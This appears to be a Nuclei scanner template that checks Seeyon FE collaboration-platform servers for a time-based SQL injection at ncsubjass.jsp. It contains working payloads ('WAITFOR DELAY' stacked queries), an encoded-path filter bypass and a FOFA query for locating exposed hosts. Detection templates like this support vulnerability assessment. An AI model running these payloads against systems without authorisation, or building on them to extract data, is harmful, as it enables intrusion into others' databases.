id: zyhl-ncsubjass-sql-injection

info:
  name: 致远互联FE协作办公平台 ncsubjass SQL注入
  author: HuanXiong
  severity: high
  description: |-
    fofa: body="li_plugins_download"

  tags: SQL Injection

http:
  - raw:
      - |
        POST /fenc/ncsubjass.j%73p HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        subjcode=';WAITFOR DELAY '0:0:5'--

      - |
        POST /fenc/ncsubjass.j%73p HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Content-Type: application/x-www-form-urlencoded

        subjcode=';WAITFOR DELAY '0:0:8'--
        
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and  
      - type: status
        status: 
          - 200





